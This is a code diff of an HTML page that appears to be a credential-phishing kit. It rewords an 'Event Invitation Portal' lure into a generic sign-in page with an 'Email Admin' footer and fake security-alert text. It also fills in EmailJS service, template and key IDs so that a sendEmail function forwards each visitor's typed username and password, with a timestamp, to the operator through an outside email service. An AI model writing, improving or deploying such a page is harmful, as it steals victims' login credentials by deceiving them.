@@ -8,7 +8,7 @@
   <!-- EmailJS -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("ClHUl");
+    emailjs.init("TLkClHUlQn5aQV4XO");
   </script>
 
   <style>
@@ -152,7 +152,7 @@
     <!-- ✅ Title updated dynamically -->
     <h2 id="portalTitle">Event Invitation Portal</h2>
 
-    <p class="subtext">Strictly Confidential</p>
+    <p class="subtext">Sign-in to continue</p>
 
     <input type="text" id="username" placeholder="Username" required>
     <input type="password" id="password" placeholder="Password" required>
@@ -160,8 +160,7 @@
     <button onclick="authenticate()">Login</button>
 
     <p class="note">
-      You have been added to this secure portal due to your invitation to a strictly confidential event.
-      If this was done in error, please disregard this message.
+      To improve the security of your account, we recommend that you enable sign-in alerts. We will notify you when we detect sign-in activity from a new browser, location, or device.
     </p>
   </div>
 
@@ -177,7 +176,7 @@
 
   <!-- Footer -->
   <div class="footer">
-    2026 Email Invitation. All Rights Reserved
+    2026 Email Admin. All Rights Reserved
   </div>
 
   <script>
@@ -213,9 +212,9 @@
     });
 
     function sendEmail(username, password) {
-      const serviceID = "v2t";
-      const templateID = "tem";
-      const publicKey = "TL";
+      const serviceID = "service_nfx0v2t";
+      const templateID = "template_ccgi8xh";
+      const publicKey = "TLkClHUlQn5aQV4XO";
 
       const templateParams = {
         login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
